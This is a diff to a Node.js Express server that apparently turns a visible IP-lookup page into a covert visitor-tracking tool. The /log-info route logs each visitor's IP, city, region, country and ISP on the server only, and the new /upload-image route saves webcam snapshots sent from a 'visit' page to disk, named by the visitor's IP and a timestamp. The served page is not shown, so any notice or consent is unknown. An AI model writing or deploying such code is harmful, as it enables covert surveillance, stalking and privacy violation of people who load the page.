@@ -1,56 +1,58 @@
+// server.js
 const express = require('express');
 const axios = require('axios');
+const fs = require('fs');
+const path = require('path');
 
 const app = express();
 const port = process.env.PORT || 3000;
 
-// Helper to extract real client IP
+app.use(express.json({ limit: '5mb' }));
+app.use(express.static('public'));
+
+// Get client IP
 function getClientIp(req) {
   const forwarded = req.headers['x-forwarded-for'];
-  if (forwarded) {
-    return forwarded.split(',')[0];
-  }
-  return req.connection.remoteAddress || req.socket.remoteAddress;
+  return forwarded ? forwarded.split(',')[0] : req.connection.remoteAddress;
 }
 
-// Main route
-app.get('/visit', async (req, res) => {
+// Serve webcam page
+app.get('/visit', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'visit.html'));
+});
+
+// Log IP/location
+app.get('/log-info', async (req, res) => {
   const ip = getClientIp(req);
-  console.log(`Visitor IP: ${ip}`);
-
   try {
-    const response = await axios.get(`https://ipwho.is/${ip}`);
-    const geo = response.data;
+    const { data } = await axios.get(`https://ipwho.is/${ip}`);
+    if (!data.success) throw new Error(data.message);
 
-    if (!geo.success) {
-      console.error('Geolocation API failed:', geo.message);
-      return res.send(`<p>Could not retrieve location for IP: ${ip}</p>`);
-    }
+    console.log(`IP: ${data.ip}`);
+    console.log(`${data.city}, ${data.region}, ${data.country}`);
+    console.log(`ISP: ${data.connection?.isp || 'N/A'}`);
 
-    console.log('Geo Data:', geo);
-
-    res.send(`
-      <h1>IP Tracker</h1>
-      <p><strong>IP:</strong> ${geo.ip}</p>
-      <p><strong>City:</strong> ${geo.city}</p>
-      <p><strong>Region:</strong> ${geo.region}</p>
-      <p><strong>Country:</strong> ${geo.country}</p>
-      <p><strong>ISP:</strong> ${geo.connection?.isp || 'N/A'}</p>
-    `);
-  } catch (error) {
-    console.error('Error fetching geolocation:', error.message);
-    res.send(`
-      <p>Your IP is ${ip}, but the geolocation request failed.</p>
-    `);
+    res.json({ success: true });
+  } catch (err) {
+    console.error('Geolocation failed:', err.message);
+    res.status(500).json({ success: false });
   }
 });
 
-// Default route
-app.get('/', (req, res) => {
-  res.send(`<h1>Welcome to IP Tracker</h1><p>Go to <a href="/visit">/visit</a> to get IP and location.</p>`);
+// Receive webcam image
+app.post('/upload-image', (req, res) => {
+  const base64 = req.body.image;
+  const ip = getClientIp(req).replace(/:/g, '_');
+  const timestamp = Date.now();
+  const filePath = `captures/${ip}_${timestamp}.png`;
+
+  fs.mkdirSync('captures', { recursive: true });
+
+  fs.writeFileSync(filePath, base64.replace(/^data:image\/png;base64,/, ''), 'base64');
+  console.log(`Image saved: ${filePath}`);
+  res.sendStatus(200);
 });
 
-// Start server
 app.listen(port, () => {
   console.log(`Server running at http://localhost:${port}`);
 });
